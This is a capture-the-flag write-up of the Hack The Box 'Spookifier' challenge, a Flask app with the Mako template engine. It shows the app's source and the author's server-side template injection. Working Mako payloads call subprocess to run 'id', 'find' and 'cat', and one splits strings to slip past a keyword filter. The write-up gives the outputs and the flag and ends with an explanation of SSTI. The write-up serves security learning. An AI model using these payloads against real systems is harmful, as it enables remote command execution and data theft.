# Spookifier

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

* wappalyzer

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

from this info, we know that this webapp is using Python 3.8.15 and Flask 2.0.0 as their framework.

* page source

```html
<html>

<head>
    <title>
        Name Spookifier
    </title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css"
        integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link href='https://fonts.googleapis.com/css?family=Press Start 2P' rel='stylesheet'>
    <link rel="stylesheet" href="static/css/index.css" />
</head>

<body>
    <div class="container">
        <h3><img class="vamp" src="static/images/vamp.png"> Name Spookifier <img class="vamp"
                src="static/images/vamp.png"></h3>
        <p>Enter your new Halloween name here</p>
        <form action="/">
            <input id="input" name="text" type="text" value="" />
            <button id="go" type="submit">Spookify</button>
        </form>

        <div class="output"></div>
        <table class="table table-bordered">
            <tbody>
                
            </tbody>
        </table>
        </div>


    </div>
    <div class="bg"></div>

    <!-- //////////////// SHADOW //////////////// -->
    <div class="spider-web shadow"></div>
    <div class="containerx shadow">
        <div class="arm-containerx right">
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
        </div>
        <div class="arm-containerx left">
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
        </div>
        <div class="spider-body shadow-body">
            <div class="eye eye-left"></div>
            <div class="eye eye-right"></div>
        </div>
    </div>

    <!-- //////////////// SPIDER //////////////// -->
    <div class="spider-web"></div>
    <div class="containerx">
        <div class="arm-containerx right">
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
        </div>
        <div class="arm-containerx left">
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
            <div class="arm A">
                <div class="arm B">
                    <div class="arm C"></div>
                </div>
            </div>
        </div>
        <div class="spider-body">
            <div class="eye eye-left"></div>
            <div class="eye eye-right"></div>
        </div>
    </div>

    <div class="wrap">
        <i class="star-a"></i>
        <i class="star-b"></i>
        <i class="star-c"></i>
        <i class="star-d"></i>
        <i class="star-e"></i>
        <i class="star-f"></i>
        <i class="star-g"></i>
        <div class="tree">
            <i class="dtl-a"></i>
            <i class="dtl-b"></i>
            <i class="dtl-c"></i>
            <i class="dtl-d"></i>
            <i class="dtl-e"></i>
            <i class="dtl-f"></i>
            <i class="dtl-g"></i>
            <i class="dtl-h"></i>
            <i class="dtl-i"></i>
            <i class="dtl-j"><i class="dtl-1"></i><i class="dtl-2"></i></i>
            <i class="dtl-k"></i>
            <i class="dtl-l"></i>
            <i class="dtl-m"><i class="dtl-1"></i><i class="dtl-2"></i></i>
            <i class="dtl-n"><i class="dtl-1"></i></i>
            <i class="dtl-o"><i class="dtl-1"></i></i>
        </div>
        <div class="bottom"></div>
        <div class="text">
            <i>H</i><i>a</i><i>p</i><i>p</i><i>y</i><i></i>
            <i>H</i><i>a</i><i>l</i><i>l</i><i>o</i><i>w</i><i>e</i><i>e</i><i>n</i>
        </div>
        <div class="ghost"><i class="ghom"></i><i class="ghot"></i><i class="ghod"></i></div>
        <div class="pumpkin pa"><i class="face"></i><i class="mouth"><i class="teeth"></i><i class="detail"></i></i>
        </div>
        <div class="pumpkin pb"><i class="face"></i><i class="mouth"><i class="teeth"></i><i class="detail"></i></i>
        </div>
        <div class="pumpkin pc"><i class="face"></i><i class="mouth"><i class="teeth"></i><i class="detail"></i></i>
        </div>
        <div class="pumpkin pd"><i class="face"></i><i class="mouth"><i class="teeth"></i><i class="detail"></i></i>
        </div>
        <div class="pillar">
            <i class="pila"></i>
            <i class="pilb"></i>
            <i class="pilc"></i>
            <i class="pild"></i>
            <i class="pils-a"></i>
            <i class="pils-b"></i>
            <i class="pils-c"></i>
            <i class="spider">
                <i class="leg-a"></i>
                <i class="leg-b"></i>
                <i class="leg-c"></i>
            </i>
        </div>
        <div class="stone sa"><i class="mrk"><i></i><i></i></i><i class="stoa"></i><i class="stob"></i><i
                class="stoc"></i></div>
        <div class="stone sb"><i class="txt"></i><i class="stoa"></i><i class="stob"></i><i class="stoc"></i><i
                class="stod"></i></div>
        <div class="owl"><i class="head"></i></div>
        <div class="bone ba"><i class="bl"></i><i class="br"></i></div>
        <div class="bone bb"><i class="bl"></i><i class="br"></i></div>
        <div class="bone bc"><i class="bl"></i><i class="br"></i></div>
        <div class="skull"><i class="eye el"></i><i class="eye er"></i><i class="nose"></i><i class="teeth"></i><i
                class="crack"></i></div>
    </div>
</body>

</html>
```

* main.py

```python
from flask import Flask, jsonify
from application.blueprints.routes import web
from flask_mako import MakoTemplates

app = Flask(__name__)
MakoTemplates(app)

def response(message):
    return jsonify({'message': message})

app.register_blueprint(web, url_prefix='/')

@app.errorhandler(404)
def not_found(error):
    return response('404 Not Found'), 404

@app.errorhandler(403)
def forbidden(error):
    return response('403 Forbidden'), 403

@app.errorhandler(400)
def bad_request(error):
    return response('400 Bad Request'), 400

```

from this code, this web app is using Mako as a templating engine. from my observation, this challenge is quietly a SSTI (Server-Side Template Injection) which is we will inject a malicious code on the server.&#x20;



* util.py

```python
from mako.template import Template

font1 = {
	'A': '𝕬',
	'B': '𝕭',
	'C': '𝕮',
	'D': '𝕯',
	'E': '𝕰',
	'F': '𝕱',
	'G': '𝕲',
	'H': '𝕳',
	'I': '𝕴',
	'J': '𝕵',
	'K': '𝕶',
	'L': '𝕷',
	'M': '𝕸',
	'N': '𝕹',
	'O': '𝕺',
	'P': '𝕻',
	'Q': '𝕼',
	'R': '𝕽',
	'S': '𝕾',
	'T': '𝕿',
	'U': '𝖀',
	'V': '𝖁',
	'W': '𝖂',
	'X': '𝖃',
	'Y': '𝖄',
	'Z': '𝖅',
	'a': '𝖆',
	'b': '𝖇',
	'c': '𝖈',
	'd': '𝖉',
	'e': '𝖊',
	'f': '𝖋',
	'g': '𝖌',
	'h': '𝖍',
	'i': '𝖎',
	'j': '𝖏',
	'k': '𝖐',
	'l': '𝖑',
	'm': '𝖒',
	'n': '𝖓',
	'o': '𝖔',
	'p': '𝖕',
	'q': '𝖖',
	'r': '𝖗',
	's': '𝖘',
	't': '𝖙',
	'u': '𝖚',
	'v': '𝖛',
	'w': '𝖜',
	'x': '𝖝',
	'y': '𝖞',
	'z': '𝖟',
	' ': ' '
}

font2 = {
	'A': 'ᗩ', 
	'B': 'ᗷ',
	'C': 'ᑢ',
	'D': 'ᕲ',
	'E': 'ᘿ',
	'F': 'ᖴ',
	'G': 'ᘜ',
	'H': 'ᕼ',
	'I': 'ᓰ',
	'J': 'ᒚ',
	'K': 'ᖽᐸ',
	'L': 'ᒪ',
	'M': 'ᘻ',
	'N': 'ᘉ',
	'O': 'ᓍ',
	'P': 'ᕵ',
	'Q': 'ᕴ',
	'R': 'ᖇ',
	'S': 'S',
	'T': 'ᖶ',
	'U': 'ᑘ',
	'V': 'ᐺ',
	'W': 'ᘺ',
	'X': '᙭',
	'Y': 'Ɏ',
	'Z': 'Ⱬ',
	'a': 'ᗩ', 
	'b': 'ᗷ',
	'c': 'ᑢ',
	'd': 'ᕲ',
	'e': 'ᘿ',
	'f': 'ᖴ',
	'g': 'ᘜ',
	'h': 'ᕼ',
	'i': 'ᓰ',
	'j': 'ᒚ',
	'k': 'ᖽᐸ',
	'l': 'ᒪ',
	'm': 'ᘻ',
	'n': 'ᘉ',
	'o': 'ᓍ',
	'p': 'ᕵ',
	'q': 'ᕴ',
	'r': 'ᖇ',
	's': 'S',
	't': 'ᖶ',
	'u': 'ᑘ',
	'v': 'ᐺ',
	'w': 'ᘺ',
	'x': '᙭',
	'y': 'Ɏ',
	'z': 'Ⱬ',

	' ': ' '
}

font3 = {
	'A': '₳', 
	'B': '฿',
	'C': '₵',
	'D': 'Đ',
	'E': 'Ɇ',
	'F': '₣',
	'G': '₲',
	'H': 'Ⱨ',
	'I': 'ł',
	'J': 'J',
	'K': '₭',
	'L': 'Ⱡ',
	'M': '₥',
	'N': '₦',
	'O': 'Ø',
	'P': '₱',
	'Q': 'Q',
	'R': 'Ɽ',
	'S': '₴',
	'T': '₮',
	'U': 'Ʉ',
	'V': 'V',
	'W': '₩',
	'X': 'Ӿ',
	'Y': 'y̷',
	'Z': 'z̷',
	'a': '₳', 
	'b': '฿',
	'c': '₵',
	'd': 'Đ',
	'e': 'Ɇ',
	'f': '₣',
	'g': '₲',
	'h': 'Ⱨ',
	'i': 'ł',
	'j': 'J',
	'k': '₭',
	'l': 'Ⱡ',
	'm': '₥',
	'n': '₦',
	'o': 'Ø',
	'p': '₱',
	'q': 'Q',
	'r': 'Ɽ',
	's': '₴',
	't': '₮',
	'u': 'Ʉ',
	'v': 'V',
	'w': '₩',
	'x': 'Ӿ',
	'y': 'y̷',
	'z': 'z̷',
	' ': ''
} 

font4 = {
	'A': 'A', 
	'B': 'B',
	'C': 'C',
	'D': 'D',
	'E': 'E',
	'F': 'F',
	'G': 'G',
	'H': 'H',
	'I': 'I',
	'J': 'J',
	'K': 'K',
	'L': 'L',
	'M': 'M',
	'N': 'N',
	'O': 'O',
	'P': 'P',
	'Q': 'Q',
	'R': 'R',
	'S': 'S',
	'T': 'T',
	'U': 'U',
	'V': 'V',
	'W': 'W',
	'X': 'X',
	'Y': 'Y',
	'Z': 'Z',
	'a': 'a', 
	'b': 'b',
	'c': 'c',
	'd': 'd',
	'e': 'e',
	'f': 'f',
	'g': 'g',
	'h': 'h',
	'i': 'i',
	'j': 'j',
	'k': 'k',
	'l': 'l',
	'm': 'm',
	'n': 'n',
	'o': 'o',
	'p': 'p',
	'q': 'q',
	'r': 'r',
	's': 's',
	't': 't',
	'u': 'u',
	'v': 'v',
	'w': 'w',
	'x': 'x',
	'y': 'y',
	'z': 'z',
	'1': '1',
	'2': '2',
	'3': '3',
	'4': '4',
	'5': '5',
	'6': '6',
	'7': '7',
	'8': '8',
	'9': '9',
	'0': '0',
	'!': '!',
	'@': '@',
	'#': '#',
	'$': '$',
	'%': '%',
	'^': '^',
	'&': '&',
	'*': '*',
	'(': '(',
	')': ')',
	'-': '-',
	'_': '_',
	'+': '+',
	'=': '=',
	'{': '{',
	'}': '}',
	'[': '[',
	']': ']',
	'\\': '\\',
	'|': '|',
	';': ';',
	':': ':',
	'\'': '\'',
	'"': '"',
	'<': '<',
	',': ',',
	'>': '>',
	'.': '.',
	'?': '?',
	'/': '/'
	' ': ' ',
}

def generate_render(converted_fonts):
	result = '''
		<tr>
			<td>{0}</td>
        </tr>
        
		<tr>
        	<td>{1}</td>
        </tr>
        
		<tr>
        	<td>{2}</td>
        </tr>
        
		<tr>
        	<td>{3}</td>
        </tr>

	'''.format(*converted_fonts)
	
	return Template(result).render()

def change_font(text_list):
	text_list = [*text_list]
	current_font = []
	all_fonts = []
	
	add_font_to_list = lambda text,font_type : (
		[current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
		) and None

	add_font_to_list(text_list, 'font1')
	add_font_to_list(text_list, 'font2')
	add_font_to_list(text_list, 'font3')
	add_font_to_list(text_list, 'font4')

	return all_fonts

def spookify(text):
	converted_fonts = change_font(text_list=text)

	return generate_render(converted_fonts=converted_fonts)

```

this is for the font. when we entered any words, it will change the font.

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

* routes.py

```python
from flask import Blueprint, request
from flask_mako import render_template
from application.util import spookify

web = Blueprint('web', __name__)

@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html',output=converted)
    
    return render_template('index.html',output='')
```

i just tried to check if this challenge is about SSTI and i used classic SSTI payload for Mako.

```python
${7*7}
```

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

its now confirmed that this web is vulnerable to SSTI which means the templating engine (Mako) is vulnerable because of its response.

i already tried the payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#mako) but the thing is, most of the payload will returned null or Internal Server Error.&#x20;

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

from my observation, this server has a sanitized several input or has a WAF such as `os`, `sys` and `system`.  so i must modify my code to exploit this web.

{% code overflow="wrap" fullWidth="false" expandable="true" %}
```python
${self.template.module.__builtins__['__import__']('subprocess').check_output('id', shell=True)}
```
{% endcode %}

i used this payload and it works.

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

the output is:

{% code overflow="wrap" %}
```bash
b'uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n'
```
{% endcode %}

we adjust the payload to find the flag.

{% code overflow="wrap" %}
```python
${self.template.module.__builtins__['__import__']('subprocess').check_output('cat flag.txt', shell=True)}
```
{% endcode %}

tried to `cat` the `flag.txt` but the output is Internal Server Error.

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

from this output, i assumed that this web is sanitized the word `flag.txt` . so i tried to obfuscate my payload to bypass the security.

but first, lemme find the `flag.txt` to check whether the `flag.txt` is exist or not.

{% code overflow="wrap" %}
```python
${self.template.module.__builtins__['__import__']('subprocess').check_output('find / -name "*flag*" 2>/dev/null', shell=True)}
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

output:

{% code overflow="wrap" %}
```bash
b'/sys/devices/pnp0/00:01/tty/ttyS2/flags\n/sys/devices/pnp0/00:02/tty/ttyS1/flags\n/sys/devices/platform/serial8250/tty/ttyS0/flags\n/sys/devices/platform/serial8250/tty/ttyS3/flags\n/sys/devices/virtual/net/eth0/flags\n/sys/devices/virtual/net/lo/flags\n/sys/module/scsi_mod/parameters/default_dev_flags\n/usr/lib/gcc/x86_64-alpine-linux-musl/11.2.1/plugin/include/flag-types.h\n/usr/lib/gcc/x86_64-alpine-linux-musl/11.2.1/plugin/include/cfg-flags.def\n/usr/lib/gcc/x86_64-alpine-linux-musl/11.2.1/plugin/include/insn-flags.h\n/usr/lib/gcc/x86_64-alpine-linux-musl/11.2.1/plugin/include/flags.h\n/proc/sys/kernel/acpi_video_flags\n/proc/sys/net/ipv4/fib_notify_on_flag_change\n/proc/sys/net/ipv6/fib_notify_on_flag_change\n/proc/kpageflags\n/flag.txt\n'
```
{% endcode %}

and i know the `flag.txt` is exist.

improvise by obfuscate the payload and we shall see the flag.

{% code overflow="wrap" %}
```python
${self.template.module.__builtins__['__import__']('subprocess').check_output('c'+'at /fl'+'ag.txt', shell=True)}
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

**`HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}`**

{% hint style="info" %}
this vulnerability is known as SSTI (Server-Side Template Injection). it occurs when the web application fails to distinguis between safe user data (plain text) and executable code (a payload). When we inject a payload like `${...}` into the input, the vulnerable application incorrectly mixes that payload into its template code, instead of treating it as regular data.

As a result, the server-side template engine, whose job is to process template code, is tricked into treating our payload as an instruction to be executed, rather than as text to be displayed.
{% endhint %}
